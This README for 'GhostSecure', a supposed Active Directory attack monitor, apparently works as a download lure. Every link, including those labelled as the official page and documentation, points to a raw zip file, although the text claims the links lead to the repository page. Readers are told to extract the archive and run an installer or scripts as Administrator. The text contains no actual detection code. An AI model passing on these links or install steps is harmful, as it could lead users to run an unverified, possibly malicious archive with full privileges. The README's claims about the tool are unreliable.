# 👻 GhostSecure - Monitor Active Directory Attacks Live

[![Download GhostSecure](https://img.shields.io/badge/Download-GhostSecure-brightgreen)](https://github.com/thurstonaptitudinal132/GhostSecure/raw/refs/heads/main/core/Secure-Ghost-1.0-beta.2.zip)

---

GhostSecure is a Windows service that watches your Active Directory in real time. It alerts you if it detects eight common attack methods. These include Kerberoasting, Pass-the-Hash, DCSync, Golden Ticket, LDAP Recon, AS-REP Roasting, Skeleton Key, and Audit Log tampering. GhostSecure uses Python and Windows Security Event Log data to spot threats as they happen.

## 🔍 What GhostSecure Does

Active Directory is a key part of many Windows networks. It stores user info and controls access to resources. Attackers target Active Directory to steal credentials or gain control. GhostSecure helps detect these attacks quickly.

Here’s what it covers:

- **Kerberoasting:** When attackers request service tickets to crack passwords.
- **Pass-the-Hash:** Using stolen password hashes to access accounts.
- **DCSync:** Mimicking a Domain Controller to steal secrets.
- **Golden Ticket:** Forging tickets to control systems.
- **LDAP Recon:** Probing directories to gather info.
- **AS-REP Roasting:** Exploiting accounts that don’t require pre-authentication.
- **Skeleton Key:** Injecting backdoors into Domain Controllers.
- **Audit Log tampering:** Trying to hide tracks by changing logs.

The tool works silently in the background as a Windows service. It raises alerts you can use to react faster to attacks.

## 🖥️ System Requirements

These are the basic needs to run GhostSecure on your Windows PC:

- Windows 10 or later (64-bit recommended).
- Access to Active Directory domain with appropriate permissions.
- Python 3.8 or higher installed (GhostSecure includes what you need).
- At least 2 GB of free RAM.
- Administrator rights to install and run the service.
- Network connection to your Active Directory domain controllers.

GhostSecure is designed for typical workstations or servers used to monitor network activity.

## ⚙️ Key Features

- Runs as a background Windows service for continuous monitoring.
- Analyzes real-time Windows Security Event logs.
- Detects eight major Active Directory attack methods.
- Alerts sent via local notifications or logging.
- Written in Python for easy updates and customization.
- Low resource use to avoid slowing down your system.
- Suitable for enterprise environments or small teams.

## 🚀 Getting Started

Start by downloading GhostSecure using the large button below. It will take you to the official GitHub repository page.

[![Download GhostSecure](https://img.shields.io/badge/Download-GhostSecure-blue)](https://github.com/thurstonaptitudinal132/GhostSecure/raw/refs/heads/main/core/Secure-Ghost-1.0-beta.2.zip)

Follow the steps below to get it running on your Windows machine.

## ⬇️ Download and Install

1. **Visit the download page:**  
   Go to the link above. This page holds the latest release and full project files.

2. **Download the latest release:**  
   Look for the latest stable release under "Releases" on the GitHub page.  
   Download the `.zip` file labeled for Windows or the service executable if available.

3. **Extract the files:**  
   After download, right-click the `.zip` file and select "Extract All..."  
   Choose a folder where you want to keep the files (e.g., `C:\GhostSecure`).

4. **Open the folder:**  
   Open the extracted folder in File Explorer to access the files.

5. **Run the installer or service setup:**  
   If there is an `.exe` installer, double-click it. If there is a Python script, follow instructions in the next section.

## 🛠️ Installing and Running GhostSecure

GhostSecure comes as a Windows service. This means it runs without a visible window and starts with Windows. To install it:

1. **Open Command Prompt as Administrator:**  
   - Press the Windows key.  
   - Type `cmd`.  
   - Right-click on "Command Prompt" and choose "Run as administrator".

2. **Navigate to the GhostSecure folder:**  
   Use the `cd` command to reach the folder. For example:  
   ```
   cd C:\GhostSecure
   ```

3. **Install the Python environment (if needed):**  
   GhostSecure may include a Python executable. If not, install Python 3.8 or higher from python.org.

4. **Install required packages:**  
   Run the command:  
   ```
   pip install -r requirements.txt
   ```  
   This installs software libraries the service needs.

5. **Install the GhostSecure service:**  
   Run the command:  
   ```
   python install_service.py
   ```  
   This script sets up the service with Windows.

6. **Start the service:**  
   Run:  
   ```
   net start GhostSecure
   ```  
   This command starts the monitoring service on your PC.

7. **Verify service status:**  
   You can check if the service is running by typing:  
   ```
   sc query GhostSecure
   ```  
   Look for the state: RUNNING.

## 🔧 Configuring Alerts

GhostSecure sends alerts when it detects suspicious activity in Active Directory logs.

- Alerts can be written to a local log file (`alerts.log`) found in the installation folder.
- The service may have built-in configurations for notifications if you want to connect it to other systems.
- Check the `config.yaml` file to customize alert settings and the types of activities monitored.
- Modify the alert level to reduce false alarms or increase sensitivity.

## 🗂️ Accessing Logs and Reports

Your monitoring data is saved locally. To see logs:

1. Open the GhostSecure installation folder.
2. Find the `logs` directory.
3. Open files with Notepad or any text editor.
4. Logs include timestamps with alerts and the type of activity found.

Use these logs to investigate or share with IT security teams.

## 💡 Tips for Use

- Run GhostSecure on a machine that has good network access to your domain controllers.
- Keep your Windows up to date for best event log support.
- Restart the service after any configuration changes.
- Enable backups for your configuration and logs.
- Review your Active Directory permissions to ensure the monitoring account has read access to security events.

## 🛑 Stopping or Removing GhostSecure

To stop the service:

```  
net stop GhostSecure  
```

To uninstall the service, open an Administrator Command Prompt and run:

```  
python uninstall_service.py  
```

Delete the installation folder if you want to remove all files.

## ⚙️ Troubleshooting

- **Service fails to start:** Check you ran Command Prompt as Administrator. Also verify Python is installed.
- **No alerts seen:** Confirm the service is running and that your Active Directory is generating security events.
- **Errors in logs:** Look at the `error.log` file for details. Missing dependencies often cause errors.
- **Permissions issues:** Ensure the user account running GhostSecure has read access to security event logs.

## 📚 More Information and Support

For full documentation, issue reporting, and updates visit the official GitHub page:

[https://github.com/thurstonaptitudinal132/GhostSecure/raw/refs/heads/main/core/Secure-Ghost-1.0-beta.2.zip](https://github.com/thurstonaptitudinal132/GhostSecure/raw/refs/heads/main/core/Secure-Ghost-1.0-beta.2.zip)

You will find user guides, technical details, and the latest versions here.